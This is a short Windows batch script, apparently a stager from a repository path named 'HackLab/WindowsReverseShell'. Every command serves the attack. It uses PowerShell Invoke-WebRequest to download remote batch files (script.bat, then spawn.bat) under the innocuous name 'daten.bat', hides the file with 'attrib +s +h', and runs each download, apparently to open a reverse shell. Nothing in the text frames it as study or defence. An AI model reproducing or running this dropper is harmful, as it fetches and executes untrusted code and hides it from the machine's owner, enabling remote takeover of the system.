powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ItsSebis/HackLab/main/WindowsReverseShell/script.bat' -OutFile 'daten.bat'"
attrib +s +h "daten.bat"
daten.bat
powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ItsSebis/HackLab/main/WindowsReverseShell/spawn.bat' -OutFile 'daten.bat'"
daten.bat
